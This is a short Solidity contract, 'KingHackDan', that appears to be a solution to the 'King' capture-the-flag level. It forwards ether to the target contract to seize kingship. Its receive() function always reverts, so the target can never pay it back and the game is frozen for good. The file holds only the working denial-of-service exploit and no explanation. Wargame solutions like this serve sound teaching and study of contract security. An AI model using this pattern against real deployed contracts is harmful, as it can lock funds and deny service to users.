// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import {King} from "./King.sol";

contract KingHackDan {
    address immutable KING;

    constructor(address _levelAddress) {
        KING = _levelAddress;
    }

    function pwnKing() external payable {
        (bool success, ) = KING.call{value: msg.value}("");
        require(success, "King call failed");
    }

    receive() external payable {
        revert("Lol");
    }
}